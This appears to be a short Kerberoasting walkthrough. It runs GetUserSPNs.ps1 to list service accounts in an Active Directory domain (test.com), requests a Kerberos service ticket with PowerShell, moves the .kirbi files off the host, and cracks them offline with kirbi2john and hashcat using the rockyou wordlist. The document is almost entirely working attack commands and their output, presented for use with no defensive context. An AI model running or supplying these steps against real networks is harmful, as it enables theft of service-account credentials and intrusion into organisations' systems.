# GetUserSPNs.ps1

[https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1)

```
PS C:\Users\Administrator\Desktop> .\GetUserSPNs.ps1

ServicePrincipalName : HTTP/ExchangeService.test.com
Name                 : ExchangeService
SAMAccountName       : ExchangeService
MemberOf             : 
PasswordLastSet      : 1/1/1970 0:00:01 AM

ServicePrincipalName : HTTP/ExtMail.test.com
Name                 : extmailservice
SAMAccountName       : extmailservice
MemberOf             : 
PasswordLastSet      : 1/1/1970 0:00:01 AM

ServicePrincipalName : kadmin/changepw
Name                 : krbtgt
SAMAccountName       : krbtgt
MemberOf             : CN=Denied RODC Password Replication 
                       Group,CN=Users,DC=test,DC=com
PasswordLastSet      : 1/1/1970 0:00:01 AM

ServicePrincipalName : MSSQLSvc/test-app.test.com:1433
Name                 : SQLServer
SAMAccountName       : sqlServer
MemberOf             : 
PasswordLastSet      : 1/1/1970 0:00:01 AM

PS C:\Users\Administrator\Desktop> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\Administrator\Desktop> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/test-app23.test.com:1433"
```

We need to transfer .kirbi files to local machine for cracking step.

```
./kirbi2john.py ....kirbi > hash.txt

hashcat -m 13100 -a 0 hash.txt rockyou.txt --force
```
